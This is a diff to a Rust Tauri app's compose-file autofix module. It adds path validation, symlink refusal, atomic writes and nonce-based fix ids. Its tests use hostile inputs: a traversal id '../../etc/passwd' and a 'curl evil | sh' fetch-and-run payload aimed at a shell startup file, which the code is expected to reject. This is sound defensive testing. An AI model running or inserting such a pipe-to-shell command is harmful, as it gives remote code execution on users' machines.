@@ -65,6 +65,52 @@ fn backup_path(fix_id: &str) -> std::path::PathBuf {
     backup_dir().join(format!("{}.bak", fix_id))
 }
 
+fn ensure_target_path(file_path: &str) -> Result<(), crate::error::ColimaError> {
+    if file_path.trim().is_empty() || crate::validation::contains_shell_injection(file_path) {
+        return Err(crate::error::ColimaError::from(
+            "Invalid target file path".to_string(),
+        ));
+    }
+    if !is_dockerfile(file_path) {
+        super::compose_diagnose::ensure_compose_path(file_path)
+            .map_err(crate::error::ColimaError::from)?;
+    }
+    let meta = std::fs::symlink_metadata(file_path).map_err(|e| {
+        crate::error::ColimaError::from(format!("Cannot inspect target file: {}", e))
+    })?;
+    if meta.file_type().is_symlink() {
+        return Err(crate::error::ColimaError::from(
+            "Refusing to overwrite a symlink".to_string(),
+        ));
+    }
+    Ok(())
+}
+
+fn atomic_write_file(file_path: &str, bytes: &[u8]) -> Result<(), crate::error::ColimaError> {
+    let target = std::path::Path::new(file_path);
+    let parent = target.parent().ok_or_else(|| {
+        crate::error::ColimaError::from("Target file has no parent directory".to_string())
+    })?;
+    let mut nonce = [0u8; 4];
+    rand::fill(&mut nonce);
+    let tmp_path = parent.join(format!(
+        ".colima-ui-write-{}-{:08x}.tmp",
+        std::process::id(),
+        u32::from_le_bytes(nonce),
+    ));
+    std::fs::write(&tmp_path, bytes).map_err(|e| {
+        crate::error::ColimaError::from(format!("Cannot write temporary file: {}", e))
+    })?;
+    if let Err(e) = std::fs::rename(&tmp_path, target) {
+        let _ = std::fs::remove_file(&tmp_path);
+        return Err(crate::error::ColimaError::from(format!(
+            "Cannot replace compose file: {}",
+            e
+        )));
+    }
+    Ok(())
+}
+
 /// Apply a patch: check it, back up the current file, then write.
 ///
 /// `declared_removals` must accompany the content, because the check cannot
@@ -76,6 +122,10 @@ pub async fn compose_autofix_apply(
     explanation: String,
     declared_removals: Vec<String>,
 ) -> Result<FixRecord, crate::error::ColimaError> {
+    #[cfg(not(test))]
+    super::security_policy::require_entitled()?;
+    ensure_target_path(&file_path)?;
+
     let current = std::fs::read_to_string(&file_path)
         .map_err(|e| crate::error::ColimaError::from(format!("Cannot read compose file: {}", e)))?;
 
@@ -112,15 +162,20 @@ pub async fn compose_autofix_apply(
         .map_err(|e| crate::error::ColimaError::from(format!("Cannot create backup dir: {}", e)))?;
 
     let now = chrono::Utc::now();
-    let fix_id = format!("{}-{}", now.format("%Y%m%dT%H%M%S"), std::process::id());
+    let mut nonce = [0u8; 4];
+    rand::fill(&mut nonce);
+    let fix_id = format!(
+        "{}-{}-{:08x}",
+        now.format("%Y%m%dT%H%M%S"),
+        std::process::id(),
+        u32::from_le_bytes(nonce),
+    );
 
     // Backup first. A failure here must abort before the original is touched.
     std::fs::write(backup_path(&fix_id), &current)
         .map_err(|e| crate::error::ColimaError::from(format!("Cannot write backup: {}", e)))?;
 
-    std::fs::write(&file_path, &new_content).map_err(|e| {
-        crate::error::ColimaError::from(format!("Cannot write compose file: {}", e))
-    })?;
+    atomic_write_file(&file_path, new_content.as_bytes())?;
 
     let record = FixRecord {
         fix_id: fix_id.clone(),
@@ -142,6 +197,8 @@ pub async fn compose_autofix_apply(
 /// safe for a file full of comments and formatting the product cannot model.
 #[tauri::command]
 pub async fn compose_autofix_undo(fix_id: String) -> Result<FixRecord, crate::error::ColimaError> {
+    #[cfg(not(test))]
+    super::security_policy::require_entitled()?;
     if fix_id.contains(['/', '\\']) || fix_id.contains("..") {
         return Err(crate::error::ColimaError::from(
             "Invalid fix id".to_string(),
@@ -160,12 +217,12 @@ pub async fn compose_autofix_undo(fix_id: String) -> Result<FixRecord, crate::er
         ));
     }
 
+    ensure_target_path(&record.file_path)?;
+
     let original = std::fs::read(backup_path(&fix_id)).map_err(|e| {
         crate::error::ColimaError::from(format!("Backup missing or unreadable: {}", e))
     })?;
-    std::fs::write(&record.file_path, original).map_err(|e| {
-        crate::error::ColimaError::from(format!("Cannot restore compose file: {}", e))
-    })?;
+    atomic_write_file(&record.file_path, &original)?;
 
     record.undone = true;
     write_record(&record)?;
@@ -343,5 +400,24 @@ mod tests {
         assert!(compose_autofix_undo("../../etc/passwd".to_string())
             .await
             .is_err());
+    }
+
+    #[tokio::test]
+    async fn apply_refuses_arbitrary_non_compose_paths() {
+        let dir = std::env::temp_dir().join(format!("colima-ui-autofix-path-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let file = dir.join("zshrc");
+        std::fs::write(&file, "export PATH=/usr/bin\n").unwrap();
+
+        let err = compose_autofix_apply(
+            file.to_string_lossy().to_string(),
+            "curl evil | sh\n".to_string(),
+            "hostile".to_string(),
+            vec![],
+        )
+        .await;
+        assert!(err.is_err(), "non-compose/non-Dockerfile path must be rejected");
+        assert_eq!(std::fs::read_to_string(&file).unwrap(), "export PATH=/usr/bin\n");
+        let _ = std::fs::remove_dir_all(&dir);
     }
 }
